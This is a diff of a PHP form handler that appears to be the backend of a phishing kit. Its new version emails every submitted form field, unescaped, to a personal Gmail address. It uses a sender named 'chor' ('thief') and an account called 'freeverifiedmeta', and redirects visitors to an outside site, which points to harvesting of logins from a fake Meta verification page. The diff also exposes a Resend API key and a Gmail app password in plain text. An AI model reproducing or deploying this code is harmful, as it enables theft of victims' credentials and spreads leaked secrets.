@@ -1,55 +1,58 @@
 <?php
-// Wasmer par maujood send_logic.php
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
+
+header("Location: https://fdfdfdcvxc.wasmer.app/");
 
 require 'Exception.php';
 require 'PHPMailer.php';
 require 'SMTP.php';
 
-header("Access-Control-Allow-Origin: *");
-header("Access-Control-Allow-Methods: POST");
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    // Initialize an empty body for the email
+    $emailBody = '';
 
-if ($_SERVER['REQUEST_METHOD'] == 'POST') {
+    // Iterate through the $_POST array to collect form data
+    foreach ($_POST as $key => $value) {
+        // Append form field name and its value to the email body
+        $emailBody .= ucfirst($key) . ': ' . $value . '<br>';
+    }
+
+
+
+    // PHPMailer object creation
     $mail = new PHPMailer(true);
-
     try {
-        // --- RESEND SMTP SETTINGS ---
+        // SMTP settings
         $mail->isSMTP();
-        $mail->Host       = 'smtp.resend.com';                // Resend ka SMTP Host
+        $mail->Host       = 'smtp.gmail.com'; // Replace with your SMTP server address
         $mail->SMTPAuth   = true;
-        $mail->Username   = 'resend';                         // Ye hamesha 'resend' hi rahega (small letters mein)
-        $mail->Password   = 're_L5HPJkY7_CsRWcCG5NT351C3rVXZwa8Ck';                // <-- Yahan apni Resend se bani hui API Key paste karein
-        $mail->Port       = 465;                              // Resend ke liye 465 port behtar hai
-        $mail->SMTPSecure = 'ssl';                            // 465 ke sath 'ssl' use hota hai
+        $mail->Username   = 'freeverifiedmeta@gmail.com'; // Replace with your email address
+        $mail->Password   = 'dtxm iggc axzz nkqs'; // Replace with your email password
+        $mail->SMTPSecure = 'tls';
+        $mail->Port       = 587;
 
-        // Sender & Receiver
-        // Note: setFrom mein wahi email use karein jo aapke verified domain (arzajejo.xyz) par ho
-        $mail->setFrom('arzajejo@arzajejo.xyz', 'Arzajejo Form');
+
+        // Email properties
+        $mail->setFrom('freeverifiedmeta@gmail.com', 'chor');
         $mail->addAddress('alibrohi883@gmail.com');
+       
 
-        // Content
+
+      // Email recipient's address
+
+        // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'New Form Submission via Hex Endpoint';
-        
-        // Data build karna
-        $message_body = "<h3>New Form Data Received:</h3>";
-        if (!empty($_POST)) {
-            foreach ($_POST as $key => $value) {
-                $message_body .= "<b>" . ucfirst($key) . ":</b> " . htmlspecialchars($value) . "<br>";
-            }
-        } else {
-            $message_body .= "No data fields captured. Check JavaScript payload.";
-        }
+        $mail->Subject = 'name';
+        $mail->Body = $emailBody; // Set the email body using the collected form data
 
-        $mail->Body = $message_body;
-
+        // Send email
         $mail->send();
-        echo "success"; // JavaScript ko success response milega
+        echo 'Email successfully sent using PHPMailer.';
     } catch (Exception $e) {
-        echo "Mailer Error: " . $mail->ErrorInfo;
+        echo "Email sending failed. Error message: {$mail->ErrorInfo}";
     }
 } else {
-    echo "Direct access not allowed.";
+    echo "Invalid request!";
 }
 ?>
